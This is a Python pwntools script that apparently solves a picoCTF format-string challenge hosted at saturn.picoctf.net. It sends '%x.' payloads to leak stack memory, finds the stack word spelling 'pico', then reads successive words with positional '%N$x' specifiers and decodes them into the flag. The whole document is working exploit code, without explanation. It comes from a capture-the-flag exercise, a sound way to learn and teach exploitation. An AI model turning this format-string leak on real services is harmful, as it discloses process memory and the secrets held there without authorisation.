#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln")
pwn.context.binary = exe

io = pwn.remote("saturn.picoctf.net", 63923)
# io = pwn.process(exe.path)
payload = b"%x." * 42
io.sendline(payload)
io.recvuntil(b"Here's a story - \n")
leak = io.recvline().strip().split(b".")[:-1]
index = 0
for i in range(len(leak)):
    if leak[i] == b"6f636970":
        index = i
        break

io.close()

io = pwn.remote("saturn.picoctf.net", 63923)
payload = b""
for i in range(50):
    payload += b"%" + str(i + index).encode() + b"$x."
io.sendline(payload)
io.recvuntil(b"Here's a story - \n")
leak = io.recvline().strip().split(b".")[:-1]
start = False
flag = ""
for i in leak:
    if i == b"6f636970":
        start = True
    if start:
        try:
            flag += int(i,16).to_bytes(4,"little").decode()
            print(flag)
        except UnicodeDecodeError:
            break

print(flag)

